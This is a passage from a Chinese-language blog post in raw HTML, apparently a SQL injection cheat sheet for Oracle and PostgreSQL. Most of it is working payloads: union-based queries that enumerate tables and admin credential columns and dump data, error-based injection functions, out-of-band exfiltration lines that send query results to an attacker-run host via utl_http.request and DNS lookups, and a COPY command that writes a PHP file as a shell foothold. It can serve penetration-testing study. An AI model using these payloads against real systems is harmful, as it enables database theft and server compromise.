class=\"hljs-string\">&#x27;null2&#x27;</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>遍历表名，法一</p>\n  <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,table_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tables <span class=\"hljs-keyword\">where</span> rownum<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-comment\">--</span><br>查询第一个表名为NEWS<br>?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,table_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tables <span class=\"hljs-keyword\">where</span> table_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;NEWS&#x27;</span><span class=\"hljs-comment\">--</span><br>查询第二个表名为ADMIN<br>?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,table_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tables <span class=\"hljs-keyword\">where</span> table_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;NEWS&#x27;</span> <span class=\"hljs-keyword\">and</span> table_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;ADMIN&#x27;</span><span class=\"hljs-comment\">--</span><br>查询第三个表名为MD5<br>?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,table_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tables <span class=\"hljs-keyword\">where</span> table_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;NEWS&#x27;</span> <span class=\"hljs-keyword\">and</span> table_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;ADMIN&#x27;</span> <span class=\"hljs-keyword\">and</span> table_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;MD5&#x27;</span><span class=\"hljs-comment\">--</span><br>提示没有找到对应的数据即一共只有三个数据表，分别为NEWS、ADMIN、MD5<br></code></pre></td></tr></table></figure>\n<p>  这样一个一个的查表效率有点低，还可以先查询用户名，再用类似 mysql 中 group_concat() 的方式查询表名</p>\n</li>\n</ol>\n<p>法二，这个更加高效一些</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">user</span> <span class=\"hljs-keyword\">from</span> dual),<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> dual<span class=\"hljs-comment\">--</span><br>查询用户名为ORACLE1<br>?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">LISTAGG</span>(table_name,<span class=\"hljs-string\">&#x27;,&#x27;</span>)<span class=\"hljs-keyword\">within</span> <span class=\"hljs-keyword\">group</span>(<span class=\"hljs-keyword\">order</span> <span class=\"hljs-keyword\">by</span> owner)name <span class=\"hljs-keyword\">from</span> all_tables <span class=\"hljs-keyword\">where</span> owner<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;ORACLE1&#x27;</span>)),<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> dual <span class=\"hljs-comment\">--</span><br>查询表名<br></code></pre></td></tr></table></figure>\n\n<p>7.获取字段名</p>\n  <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,column_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tab_columns <span class=\"hljs-keyword\">where</span> rownum<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> table_name <span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;ADMIN&#x27;</span><span class=\"hljs-comment\">--</span><br>查询第一个字段名为UNAME<br>?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,column_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tab_columns <span class=\"hljs-keyword\">where</span> rownum<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> table_name <span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;ADMIN&#x27;</span> <span class=\"hljs-keyword\">and</span> column_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;UNAME&#x27;</span><span class=\"hljs-comment\">--</span><br>查询第二个字段名为UPASS <br></code></pre></td></tr></table></figure>\n<p>  注意自己增加rownum的数值</p>\n<p>8.查询表字段数据</p>\n  <figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,column_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tab_columns <span class=\"hljs-keyword\">where</span> rownum<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> table_name <span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;ADMIN&#x27;</span><span class=\"hljs-comment\">--</span><br>查询第一个字段名为UNAME<br>?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,column_name,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> user_tab_columns <span class=\"hljs-keyword\">where</span> rownum<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> table_name <span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;ADMIN&#x27;</span> <span class=\"hljs-keyword\">and</span> column_name<span class=\"hljs-operator\">&lt;&gt;</span><span class=\"hljs-string\">&#x27;UNAME&#x27;</span><span class=\"hljs-comment\">--</span><br>查询第二个字段名为UPASS<br></code></pre></td></tr></table></figure>\n\n\n<h3 id=\"报错注入-1\"><a href=\"#报错注入-1\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>利用 <strong>utl_inaddr.get_host_name</strong><br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在<strong>Oracle 11g以及以后</strong>的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27; and 1=utl_inaddr.get_host_name((select user from dual))-- </span><br></code></pre></td></tr></table></figure>\n\n<p>利用 <strong>ctxsys.drithsx.sn()</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))-- </span><br></code></pre></td></tr></table></figure>\n\n<p>利用 <strong>dbms_xdb_version.checkin()</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null–- </span><br></code></pre></td></tr></table></figure>\n\n<p>利用<strong>dbms_xdb_version.uncheckout()</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></code></pre></td></tr></table></figure>\n\n<p>利用<strong>dbms_utility.sqlid_to_sqlhash()</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></code></pre></td></tr></table></figure>\n\n<p>利用<strong>ordsys.ord_dicom.getmappingxpath()</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)</span><br></code></pre></td></tr></table></figure>\n\n<p>使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and 1=(select decode(substr(user,1,1),&#x27;</span>A<span class=\"hljs-string\">&#x27;,(1/0),0) from dual) --</span><br></code></pre></td></tr></table></figure>\n\n<p>这里是判断第一位是否为A,依次判断</p>\n<p><strong>XMLType</strong></p>\n<p>在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt; , 58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27;and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Oracle带外通信获取信息-dnslog注入\"><a href=\"#Oracle带外通信获取信息-dnslog注入\" class=\"headerlink\" title=\"Oracle带外通信获取信息 dnslog注入\"></a>Oracle带外通信获取信息 dnslog注入</h3><p><strong>utl_http.request()</strong>  dnslog注入</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and 1=utl_http.request(&#x27;</span>http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>(自己搭建dnslog或者用现有的):<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span><span class=\"hljs-string\">&#x27;||(select banner from sys.v_$version where rownum=1)) --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>utl_inaddr.get_host_address()</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and (select utl_inaddr.get_host_address((select user from dual)||&#x27;</span>.sssss.com(自己搭建dnslog或者用现有的)<span class=\"hljs-string\">&#x27;) from dual)is not null --</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>SYS.DBMS_LDAP.INIT</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.test.com<span class=\"hljs-operator\">/</span>oracle.jsp?name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;</span>.sssss.com(自己搭建dnslog或者用现有的)<span class=\"hljs-string\">&#x27;) from dual)is not null --</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"GetShell-2\"><a href=\"#GetShell-2\" class=\"headerlink\" title=\"GetShell\"></a>GetShell</h2><p>依靠万能的sqlmap</p>\n<h1 id=\"PostgreSQL\"><a href=\"#PostgreSQL\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h1><blockquote>\n<p><a href=\"https://blog.csdn.net/qq_51295677/article/details/125641760\">https://blog.csdn.net/qq_51295677/article/details/125641760</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/249371.html\">https://www.freebuf.com/articles/web/249371.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_42357070/article/details/81873458\">https://blog.csdn.net/qq_42357070/article/details/81873458</a></p>\n<p><a href=\"https://www.dazhuanlan.com/rainx/topics/1396671\">https://www.dazhuanlan.com/rainx/topics/1396671</a></p>\n</blockquote>\n<h2 id=\"判断方法-3\"><a href=\"#判断方法-3\" class=\"headerlink\" title=\"判断方法\"></a>判断方法</h2><p><code>and len(&#39;a&#39;)=1</code> 是否出现报错，因为在postgresql里面使用的是length函数来返回长度，如果出现报错，那么可以大致判断是postgresql或orancle（不排除其他非主流数据库类型）</p>\n<p>并且orancle可以使用dual表来判断，如果测试后无dual，就可以大致判断是postgresql了</p>\n<p>当然还有一种方式：</p>\n<p>postgreSQL查询当前数据库使用：current_database()函数</p>\n<p>开放端口：5432</p>\n<h2 id=\"基本注入-3\"><a href=\"#基本注入-3\" class=\"headerlink\" title=\"基本注入\"></a>基本注入</h2><p>结合了MySQL的语句和sqlserver的强类型，为我们的报错注入埋下了伏笔</p>\n<h3 id=\"联合查询-2\"><a href=\"#联合查询-2\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h3><ol>\n<li><p>判断闭合 注释符为–+ 同MySQL</p>\n</li>\n<li><p>获取字段数 同MySQL</p>\n</li>\n<li><p>注出回显点 结合mysql+sqlserver</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?id=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">UNION</span> <span class=\"hljs-keyword\">ALL</span> <span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-keyword\">NULL</span>,(<span class=\"hljs-string\">&#x27;11111&#x27;</span>),<span class=\"hljs-keyword\">NULL</span><span class=\"hljs-comment\">-- 查看是否输出 11111</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取数据库名</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?id=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">UNION</span> <span class=\"hljs-keyword\">ALL</span> <span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-keyword\">NULL</span>,current_database(),<span class=\"hljs-keyword\">NULL</span><span class=\"hljs-comment\">-- </span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取数据库中的表</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; union all select null,&#x27;</span>null1<span class=\"hljs-string\">&#x27;,tablename,null,null,&#x27;</span>null3<span class=\"hljs-string\">&#x27;,null,&#x27;</span>null4<span class=\"hljs-string\">&#x27; from pg_tables where schemaname=&#x27;</span><span class=\"hljs-built_in\">public</span><span class=\"hljs-string\">&#x27;--+</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取表中的列名</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?id=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">column_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-string\">&#x27;public&#x27;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;表名&#x27;</span> <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<p>​\t需要修改offest后的数字</p>\n<ol start=\"7\">\n<li><p>dump全部内容</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">12</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,列名<span class=\"hljs-number\">1</span>||<span class=\"hljs-string\">&#x27;::&#x27;</span>||列名<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-built_in\">public</span>.表名<span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<p>返回内容将是”列名1数据::列名2数据“</p>\n</li>\n</ol>\n<h3 id=\"报错注入-2\"><a href=\"#报错注入-2\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>postgresql的报错注入原理与MSSQL的相同利用强类型语言数据库特性，当类型不一致时将会报错带出敏感数据达到注入的目的。具体用到的函数与MSSQL相同，cast()或者convert()这种强制转换的函数在与一个数比较达到报错目的。（前提是目标网站开启了报错提示）。</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">查看版本：<br><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">AND</span> <span class=\"hljs-number\">2</span>=CAST((<span class=\"hljs-keyword\">SELECT</span> version())::<span class=\"hljs-type\">text</span> <span class=\"hljs-keyword\">AS</span> <span class=\"hljs-type\">NUMERIC</span>)<br><br>查库：<br><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">AND</span> <span class=\"hljs-number\">2</span>=CAST((<span class=\"hljs-keyword\">SELECT</span> current_database())::<span class=\"hljs-type\">text</span> <span class=\"hljs-keyword\">AS</span> <span class=\"hljs-type\">NUMERIC</span>)<br><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">AND</span> <span class=\"hljs-number\">2</span>=CAST((<span class=\"hljs-keyword\">SELECT</span> datname <span class=\"hljs-keyword\">from</span> pg_database <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">offset</span> <span class=\"hljs-number\">0</span>)::<span class=\"hljs-type\">text</span> <span class=\"hljs-keyword\">AS</span> <span class=\"hljs-type\">NUMERIC</span>)<br><br>查表：<br><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">AND</span> <span class=\"hljs-number\">2</span>=CAST((<span class=\"hljs-keyword\">SELECT</span> relname <span class=\"hljs-keyword\">from</span> pg_stat_user_tables <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">offset</span> <span class=\"hljs-number\">0</span>)::<span class=\"hljs-type\">text</span> <span class=\"hljs-keyword\">AS</span> <span class=\"hljs-type\">NUMERIC</span>)<br><br><br>查列：<br><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">AND</span> <span class=\"hljs-number\">2</span>=CAST((<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">column_name</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;test&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">offset</span> <span class=\"hljs-number\">0</span>)::<span class=\"hljs-type\">text</span> <span class=\"hljs-keyword\">AS</span> <span class=\"hljs-type\">NUMERIC</span>)<br><br><br>还有一个sqlmap跑出来的payload（仅供参考）：<br><span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">AND</span> <span class=\"hljs-number\">7778</span>=CAST((CHR(<span class=\"hljs-number\">113</span>)||CHR(<span class=\"hljs-number\">98</span>)||CHR(<span class=\"hljs-number\">122</span>)||CHR(<span class=\"hljs-number\">106</span>)||CHR(<span class=\"hljs-number\">113</span>))||(<span class=\"hljs-keyword\">SELECT</span> (<span class=\"hljs-keyword\">CASE</span> <span class=\"hljs-keyword\">WHEN</span> (<span class=\"hljs-number\">7778</span>=<span class=\"hljs-number\">7778</span>) <span class=\"hljs-keyword\">THEN</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">ELSE</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">END</span>))::<span class=\"hljs-type\">text</span>||(CHR(<span class=\"hljs-number\">113</span>)||CHR(<span class=\"hljs-number\">118</span>)||CHR(<span class=\"hljs-number\">112</span>)||CHR(<span class=\"hljs-number\">106</span>)||CHR(<span class=\"hljs-number\">113</span>)) <span class=\"hljs-keyword\">AS</span> <span class=\"hljs-type\">NUMERIC</span>)<br>这里解释一下这几个函数在这里面的作用：<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"GetShell-3\"><a href=\"#GetShell-3\" class=\"headerlink\" title=\"GetShell\"></a>GetShell</h2><p>普通写shell</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\"><span class=\"hljs-keyword\">COPY</span> (<span class=\"hljs-keyword\">select</span> <span class=\"hljs-string\">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class=\"hljs-keyword\">to</span> <span class=\"hljs-string\">&#x27;/tmp/1.php&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<p>偌大的互联网，我竟然只找到一句有用的😭</p>\n<h2 id=\"报错注入-3\"><a href=\"#报错注入-3\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><ul>\n<li><strong>utl_inaddr.get_host_name</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">在11g之前不需要任何权限，在11g之后当前的数据库用户必须有网络访问权限<br>select utl_inaddr.get_host_name((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>ctxsys.drithsx.sn</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">处理文本的函数，传入参数错误的时会报错返回异常<br>select ctxsys.drithsx.sn(1, (select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>CTXSYS.CTX_REPORT.TOKEN_TYPE</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">用于处理文本，也会出现参数错误返回异常<br>select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#x27;123&#x27;) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>XMLType</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">XMLType是oracle系统定义的数据类型，系统预定义了内部函数去访问XML数据<br>select XMLType(&#x27;&lt;:&#x27;||(select user from dual)||&#x27;&gt;&#x27;) from dual;<br>PS：调用的时候必须以&lt;:开头和&gt;结尾，即 &#x27;&lt;:&#x27;||balabala||&#x27;&gt;&#x27; 或者 chr(60)||balabal||chr(62）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex，再导出(或者有replace函数替换成其他非空字符)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>dbms_xdb_version.checkin</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select dbms_xdb_version.checkin((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>dbms_xdb_version.makeversioned</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select dbms_xdb_version.makeversioned((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>dbms_xdb_version.uncheckout</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select dbms_xdb_version.uncheckout((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>dbms_utility.sqlid_to_sqlhash</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>ordsys.ord_dicom.getmappingxpath</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UTL_INADDR.get_host_name</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code 